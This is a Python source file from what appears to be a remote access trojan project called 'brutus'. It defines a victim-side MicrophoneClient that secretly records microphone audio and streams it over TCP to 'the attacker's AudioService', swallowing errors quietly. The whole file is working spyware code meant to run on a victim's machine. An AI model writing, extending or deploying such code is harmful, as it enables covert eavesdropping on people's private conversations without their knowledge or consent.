import time

from brutus.victim.client.tcp_client import TCPClient

CHANNELS = 1
RATE = 44100
CHUNK = 4096


class MicrophoneClient(TCPClient):
    """Capture microphone audio and stream raw bytes to the attacker's AudioService."""

    def run(self) -> None:
        import pyaudio

        FORMAT = pyaudio.paInt16

        try:
            self.connect()
        except Exception:
            return

        pa = pyaudio.PyAudio()
        stream = None
        try:

            def _callback(in_data, frame_count, time_info, status):
                try:
                    self.sendall(in_data)
                    return (None, pyaudio.paContinue)
                except Exception:
                    return (None, pyaudio.paComplete)

            stream = pa.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK,
                stream_callback=_callback,
            )
            stream.start_stream()
            while self.running and stream.is_active():
                time.sleep(0.1)
        finally:
            if stream:
                try:
                    stream.stop_stream()
                    stream.close()
                except Exception:
                    pass
            try:
                pa.terminate()
            except Exception:
                pass
            self.close()
